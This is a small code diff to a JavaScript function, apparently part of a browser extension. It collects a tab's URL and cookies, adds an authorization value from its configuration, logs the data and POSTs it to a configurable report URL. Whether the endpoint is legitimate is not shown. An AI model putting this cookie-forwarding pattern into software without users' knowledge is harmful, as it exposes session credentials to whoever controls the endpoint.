@@ -65,14 +65,15 @@ async function executeReport(hostname, config) {
           const reportData = {
             url: tab.url,
             cookies: cookieData,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            authorization: config.authorization
           };
           console.log('Report data:', reportData);
 
           const response = await fetch(config.reportUrl, {
             method: 'POST',
             headers: {
-              'Content-Type': 'application/json',
+              'Content-Type': 'application/json'
             },
             body: JSON.stringify(reportData)
           });
